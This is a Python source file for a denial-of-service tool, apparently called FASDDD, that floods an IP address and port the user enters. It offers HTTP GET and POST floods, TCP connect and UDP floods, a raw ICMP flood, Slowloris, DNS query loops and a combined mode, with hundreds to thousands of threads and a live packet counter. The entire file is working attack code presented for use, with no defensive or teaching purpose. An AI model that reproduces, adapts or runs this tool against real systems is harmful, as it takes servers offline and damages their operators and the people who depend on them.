#!/usr/bin/env python3
"""
FASDDD - Nocode
Maximum Throughput Packet Flood Tool
"""
import socket
import threading
import time
import sys
import os
from urllib import request, error
from datetime import datetime, timedelta

# Color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
RESET = '\033[0m'

class PacketFlooder:
    def __init__(self):
        self.packet_count = 0
        self.lock = threading.Lock()
        self.running = False
        self.start_time = None
        
    def increment(self):
        with self.lock:
            self.packet_count += 1
    
    def get_count(self):
        with self.lock:
            return self.packet_count
    
    def reset(self):
        with self.lock:
            self.packet_count = 0
            self.start_time = datetime.now()

    def http_flood(self, target, port, end_time):
        """HTTP GET flood"""
        url = f"http://{target}:{port}/"
        while datetime.now() < end_time and self.running:
            try:
                req = request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                request.urlopen(req, timeout=1)
                self.increment()
            except:
                self.increment()

    def http_post_flood(self, target, port, end_time):
        """HTTP POST flood with payload"""
        url = f"http://{target}:{port}/"
        payload = ('A' * 8192).encode()
        while datetime.now() < end_time and self.running:
            try:
                req = request.Request(url, data=payload, headers={'User-Agent': 'Mozilla/5.0'})
                request.urlopen(req, timeout=1)
                self.increment()
            except:
                self.increment()

    def tcp_syn_flood(self, target, port, end_time):
        """TCP SYN flood"""
        while datetime.now() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((target, port))
                s.close()
                self.increment()
            except:
                self.increment()

    def udp_flood(self, target, port, end_time):
        """UDP packet flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(65507)
        while datetime.now() < end_time and self.running:
            try:
                sock.sendto(payload, (target, port))
                self.increment()
            except:
                self.increment()
        sock.close()

    def icmp_flood(self, target, end_time):
        """ICMP flood (requires root/admin)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print(f"{RED}[!] ICMP flood requires root/admin privileges{RESET}")
            return
        
        payload = os.urandom(65500)
        while datetime.now() < end_time and self.running:
            try:
                sock.sendto(payload, (target, 1))
                self.increment()
            except:
                self.increment()
        sock.close()

    def slowloris(self, target, port, end_time):
        """Slowloris attack"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            self.increment()
            
            while datetime.now() < end_time and self.running:
                try:
                    s.send(b"X-a: b\r\n")
                    self.increment()
                    time.sleep(10)
                except:
                    break
            s.close()
        except:
            pass

    def dns_flood(self, target, end_time):
        """DNS query flood"""
        while datetime.now() < end_time and self.running:
            try:
                socket.gethostbyname(target)
                self.increment()
            except:
                self.increment()

    def display_stats(self, end_time, color):
        """Real-time stats display"""
        while datetime.now() < end_time and self.running:
            elapsed = int((datetime.now() - self.start_time).total_seconds())
            count = self.get_count()
            rate = count // elapsed if elapsed > 0 else 0
            
            sys.stdout.write(f"\r{color}[PACKETS] {count:,} | [RATE] {rate:,}/s | [TIME] {elapsed}s{RESET}")
            sys.stdout.flush()
            time.sleep(0.5)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{RED}
===============================================================================

██████╗░░█████╗░░██████╗  ████████╗░█████╗░░█████╗░██╗░░░░░  ███╗░░░███╗░█████╗░██████╗░███████╗
██╔══██╗██╔══██╗██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░  ████╗░████║██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║╚█████╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░  ██╔████╔██║███████║██║░░██║█████╗░░
██║░░██║██║░░██║░╚═══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░  ██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░
██████╔╝╚█████╔╝██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗  ██║░╚═╝░██║██║░░██║██████╔╝███████╗
╚═════╝░░╚════╝░╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝

██████╗░██╗░░░██╗  ███████╗░█████╗░░██████╗██████╗░██████╗░██████╗░
██╔══██╗╚██╗░██╔╝  ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗
██████╦╝░╚████╔╝░  █████╗░░███████║╚█████╗░██║░░██║██║░░██║██║░░██║
██╔══██╗░░╚██╔╝░░  ██╔══╝░░██╔══██║░╚═══██╗██║░░██║██║░░██║██║░░██║
██████╦╝░░░██║░░░  ██║░░░░░██║░░██║██████╔╝██████╔╝██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═════╝░╚═════╝░

 ===============================================================================
{RESET}""")

def main():
    flooder = PacketFlooder()
    
    while True:
        banner()
        
        # Input
        target = input(f"{GREEN}[+] Target IPv4: {RESET}")
        port = int(input(f"{GREEN}[+] Port: {RESET}"))
        threads = int(input(f"{GREEN}[+] Threads (500-5000 recommended): {RESET}"))
        duration = int(input(f"{GREEN}[+] Duration (seconds, 0 = infinite): {RESET}"))
        
        print(f"\n{CYAN} ============================================================================={RESET}")
        print(f"{YELLOW}  [1] HTTP GET Barrage    [2] HTTP POST Flood    [3] TCP SYN Storm{RESET}")
        print(f"{YELLOW}  [4] UDP Nuclear         [5] ICMP Avalanche     [6] Slowloris{RESET}")
        print(f"{YELLOW}  [7] DNS Hammer          [8] COMBINED HELL{RESET}")
        print(f"{CYAN} ============================================================================={RESET}\n")
        
        method = input(f"{GREEN}[+] Method: {RESET}")
        
        # Setup
        flooder.reset()
        flooder.running = True
        end_time = datetime.now() + timedelta(seconds=duration) if duration > 0 else datetime.max
        
        print(f"\n{CYAN} ============================================================================={RESET}")
        print(f"{YELLOW}  TARGET: {target}:{port} | THREADS: {threads}{RESET}")
        print(f"{CYAN} ============================================================================={RESET}\n")
        
        time.sleep(2)
        
        # Launch attack based on method
        thread_list = []
        
        if method == '1':
            print(f"{GREEN}[*] HTTP GET BARRAGE ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.http_flood, args=(target, port, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, GREEN)
            
        elif method == '2':
            print(f"{GREEN}[*] HTTP POST FLOOD ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.http_post_flood, args=(target, port, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, GREEN)
            
        elif method == '3':
            print(f"{RED}[*] TCP SYN STORM ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.tcp_syn_flood, args=(target, port, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, RED)
            
        elif method == '4':
            print(f"{MAGENTA}[*] UDP NUCLEAR FLOOD ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.udp_flood, args=(target, port, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, MAGENTA)
            
        elif method == '5':
            print(f"{CYAN}[*] ICMP AVALANCHE ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.icmp_flood, args=(target, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, CYAN)
            
        elif method == '6':
            print(f"{YELLOW}[*] SLOWLORIS ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.slowloris, args=(target, port, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, YELLOW)
            
        elif method == '7':
            print(f"{WHITE}[*] DNS HAMMER ACTIVE{RESET}\n")
            for _ in range(threads):
                t = threading.Thread(target=flooder.dns_flood, args=(target, end_time))
                t.daemon = True
                t.start()
                thread_list.append(t)
            flooder.display_stats(end_time, WHITE)
            
        elif method == '8':
            print(f"{YELLOW}[*] COMBINED ASSAULT ACTIVE{RESET}\n")
            third = threads // 3
            for _ in range(third):
                threading.Thread(target=flooder.http_flood, args=(target, port, end_time), daemon=True).start()
            for _ in range(third):
                threading.Thread(target=flooder.tcp_syn_flood, args=(target, port, end_time), daemon=True).start()
            for _ in range(third):
                threading.Thread(target=flooder.udp_flood, args=(target, port, end_time), daemon=True).start()
            flooder.display_stats(end_time, YELLOW)
        
        # Wait for completion
        flooder.running = False
        print(f"\n\n{CYAN}[+] Attack complete. Total packets: {flooder.get_count():,}{RESET}\n")
        
        # Menu
        print(f"{CYAN} ============================================================================={RESET}")
        print(f"{GREEN}  [1] New Attack    [2] Exit{RESET}")
        print(f"{CYAN} ============================================================================={RESET}\n")
        
        choice = input(f"{GREEN}[+] Choice: {RESET}")
        if choice == '2':
            print(f"\n{RED}[*] Exiting...{RESET}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Interrupted by user{RESET}")
        sys.exit(0)